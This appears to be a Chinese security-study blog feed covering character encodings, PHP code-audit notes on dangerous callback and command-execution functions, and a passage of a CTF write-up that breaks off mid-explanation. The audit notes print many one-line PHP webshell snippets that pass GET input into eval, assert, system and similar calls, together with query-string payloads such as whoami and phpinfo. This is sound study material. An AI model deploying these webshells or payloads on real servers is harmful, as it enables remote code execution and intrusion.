<h2 id="2、HTML实体编码——示例与Unicode相同"><a href="#2、HTML实体编码——示例与Unicode相同" class="headerlink" title="2、HTML实体编码——示例与Unicode相同"></a>2、HTML实体编码——示例与Unicode相同</h2><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p>
<p>这么做的目的主要有两个：<br>１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&lt; 或 &lt;<br>大于号这样写：&gt; 或 &gt;<br>前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。<br>２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194551860.png" alt="image-20220721194551860"></p>
<h2 id="3、16进制Unicode——示例"><a href="#3、16进制Unicode——示例" class="headerlink" title="3、16进制Unicode——示例"></a>3、16进制Unicode——示例</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194631625.png" alt="image-20220721194631625"></p>
<p>常用解密网站：</p>
<p>  <strong>·</strong>Unicode：</p>
<p><code>www.sojson.com</code></p>
<p>  <strong>·</strong>16进制Unicode：</p>
<p><code>www.msxindl.com</code></p>
<p> <strong>·</strong>HTML字符实体：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>….还有一些引入密钥的非对称型算法，可以看看原文</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计知识点记录</title>
    <url>/2022/06/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p><u><code>代码审计学习的一些笔记</code></u></p>
<span id="more"></span>

<h1 id="代码审计-常见php威胁函数（上）"><a href="#代码审计-常见php威胁函数（上）" class="headerlink" title="代码审计-常见php威胁函数（上）"></a>代码审计-常见php威胁函数（上）</h1><p>文章来自<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">成都知道创宇</a></p>
<h2 id="1-常见php回调函数，可调用其他命令-代码执行函数"><a href="#1-常见php回调函数，可调用其他命令-代码执行函数" class="headerlink" title="1.常见php回调函数，可调用其他命令/代码执行函数"></a>1.常见php回调函数，可调用其他命令/代码执行函数</h2><p>call_user_func()</p>
<p>call_user_func_array()</p>
<p>create_function()</p>
<p>array_walk()</p>
<p>array_map()</p>
<p>array_filter()</p>
<p>usort()</p>
<p>ob_start()</p>
<p>可变函数$_GET<a href="$_GET%5B'b'%5D">‘a’</a></p>
<h2 id="2-常见php可执行系统命令的函数："><a href="#2-常见php可执行系统命令的函数：" class="headerlink" title="2.常见php可执行系统命令的函数："></a>2.常见php可执行系统命令的函数：</h2><p>system()、passthru()、exec()、shell_exec()、 pcntl_exec()、popen()、proc_open()</p>
<h2 id="3-常见php可代码执行的函数："><a href="#3-常见php可代码执行的函数：" class="headerlink" title="3.常见php可代码执行的函数："></a>3.常见php可代码执行的函数：</h2><p>eval()、assert()、preg_replace()、$</p>
<h2 id="4-禁用危险函数："><a href="#4-禁用危险函数：" class="headerlink" title="4.禁用危险函数："></a>4.禁用危险函数：</h2><p>php配置文件php.ini里有个disable_functions = 配置选项，可自定义禁用某些php危险函数.如:disable_functions =system,passthru,shell_exec,exec,popen</p>
<h2 id="一、可执行php代码的函数"><a href="#一、可执行php代码的函数" class="headerlink" title="一、可执行php代码的函数"></a>一、可执行php代码的函数</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>php 7.1.7 ，已经无法用call_user_func回调调用 test.php?cmd=phpinfo(); preg_replace()  5.6以下可以执行 5.6以上仍然可以执行，但是会有警告 PHP7后已经不支持/e修饰符  preg_replace(“/test/e”,$_GET[“h”],”jutst test”); //将jutst  test以/test正则匹配以h来替换 /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码  ?h=phpinfo() ${phpinfo()}</p>
<h2 id="二、常见php回调函数，可调用其他命令-代码执行函数："><a href="#二、常见php回调函数，可调用其他命令-代码执行函数：" class="headerlink" title="二、常见php回调函数，可调用其他命令/代码执行函数："></a>二、常见php回调函数，可调用其他命令/代码执行函数：</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p>call_user_func — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //命令执行</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>创建匿名函数（Anonymous functions），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk — 使用用户自定义函数对数组中的每个元素做回调处理</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()为数组的每个元素应用回调函数。返回数组，是为 array1 每个元素应用 callback函数之后的数组。callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()用回调函数过滤数组中的单元。依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true， 则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="7-可变函数-var-args"><a href="#7-可变函数-var-args" class="headerlink" title="7) 可变函数$var(args)"></a>7) 可变函数$var(args)</h3><p>PHP 支持可变函数的概念。如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数， 并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>本函数将用用户自定义的比较函数对一个数组中的值进行排序 php5.6之前可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="9）uasort"><a href="#9）uasort" class="headerlink" title="9）uasort"></a>9）uasort</h3><p>php5.6 php7不可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POST传参: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="10）ob-start"><a href="#10）ob-start" class="headerlink" title="10）ob_start"></a>10）ob_start</h3><p>ob_start — 打开输出控制缓冲</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure></div>

<h2 id="三、常见php可执行系统命令的函数："><a href="#三、常见php可执行系统命令的函数：" class="headerlink" title="三、常见php可执行系统命令的函数："></a>三、常见php可执行系统命令的函数：</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-sell-exec"><a href="#4-sell-exec" class="headerlink" title="4) sell_exec()"></a>4) sell_exec()</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>要求：linux系统特有模块，需编译选项中存在—enable-pcntl</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打一个进程通道</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//从通道取出内容</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">类似 <span class="title function_ invoke__">popen</span>() 函数， 但是 <span class="title function_ invoke__">proc_open</span>() 提供了更加强大的控制程序执行的能力</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="8-反单引号"><a href="#8-反单引号" class="headerlink" title="8) 反单引号"></a>8) 反单引号</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="四、文件包含"><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h2><p>include将会包含语句并执行指定文件 PHP的配置文件allowurlfopen和allow_url_include设置为ON  include/require等包含函数可以加载远程文件 include include_once requeire require_once  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="五、php伪协议【web-study已记】"><a href="#五、php伪协议【web-study已记】" class="headerlink" title="五、php伪协议【web-study已记】"></a>五、<a href="../../../../Web-study">php伪协议【web-study已记】</a></h2><h2 id="六、文件操作类威胁函数"><a href="#六、文件操作类威胁函数" class="headerlink" title="六、文件操作类威胁函数"></a>六、文件操作类威胁函数</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>比赛题目wp&amp;感悟记录</title>
    <url>/2022/06/26/Game-wp/</url>
    <content><![CDATA[<p><u><code>以下是本人凑人数参加的各类比赛的题目做题经历，在此记录学习过程，望大佬指点修正</code></u></p>
<span id="more"></span>

<h1 id="NewStarCTF公开赛"><a href="#NewStarCTF公开赛" class="headerlink" title="NewStarCTF公开赛"></a>NewStarCTF公开赛</h1><h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><p><code>虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>这里绕过不细讲，都是常见的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>细讲这个</p>
<p>这个是一个<code>eval</code>函数，但是里面其实已经被<code>#</code>给注释掉了，</p>
<p>所以无论输入什么都没结果</p>
<hr>
<p>因此需要闭合或者绕过<code>#</code></p>
<p>但是我试了很多闭合方式，结果都没反应</p>
<p>最后发现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>实现了语句闭合，</p>
<p>但是，当把这个php结尾符加到后面时候，这个php就就结束了</p>
<p>以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>为例子</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure></div>

<p>当我们闭合了php代码后，那后面的<code>haha</code>的位置在哪里呢</p>
<p><img src="/2022/06/26/Game-wp/image-20220921083750913.png" alt="image-20220921083750913"></p>
<p>我们可以看到，<code>haha</code>变成了<code>html</code>代码</p>
<p>那么就可以操作了，</p>
<p>比如xss，一句话🐎的插入等</p>
<p>xss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）</p>
<hr>
<p>插入一句话🐎</p>
<p>开始因为是<code>html</code>，我是试了<code>jsp</code>一句话</p>
